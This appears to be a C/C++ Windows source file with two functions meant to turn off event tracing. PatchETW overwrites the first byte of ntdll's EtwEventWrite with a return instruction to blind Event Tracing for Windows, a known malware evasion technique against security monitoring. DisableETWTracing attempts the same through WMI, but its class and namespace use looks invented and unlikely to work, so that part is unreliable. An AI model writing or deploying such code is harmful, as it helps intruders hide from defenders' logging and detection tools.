#include <Windows.h>
#include <evntprov.h>

typedef ULONG(WINAPI* EtwEventWrite_t)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
    );

void PatchETW() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;

    EtwEventWrite_t pfnEtwEventWrite = (EtwEventWrite_t)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pfnEtwEventWrite) return;

    DWORD oldProtect;
    if (VirtualProtect(pfnEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pfnEtwEventWrite, "\xC3", 1); // ret
        VirtualProtect(pfnEtwEventWrite, 5, oldProtect, &oldProtect);
    }
}

void DisableETWTracing() {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    IWbemLocator* pLoc = NULL;
    CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);

    if (pLoc) {
        IWbemServices* pSvc = NULL;
        pLoc->ConnectServer(L"root\\Microsoft\\Windows\\WMI", NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (pSvc) {
            IWbemClassObject* pClass = NULL;
            pSvc->GetObject(L"EventTrace", 0, NULL, &pClass, NULL);

            if (pClass) {
                IWbemClassObject* pInst = NULL;
                pClass->SpawnInstance(0, &pInst);

                if (pInst) {
                    VARIANT v;
                    VariantInit(&v);
                    v.vt = VT_BOOL;
                    v.boolVal = VARIANT_FALSE;
                    pInst->Put(L"Enabled", 0, &v, 0);

                    pSvc->PutInstance(pInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                    pInst->Release();
                }
                pClass->Release();
            }
            pSvc->Release();
        }
        pLoc->Release();
    }
    CoUninitialize();
}
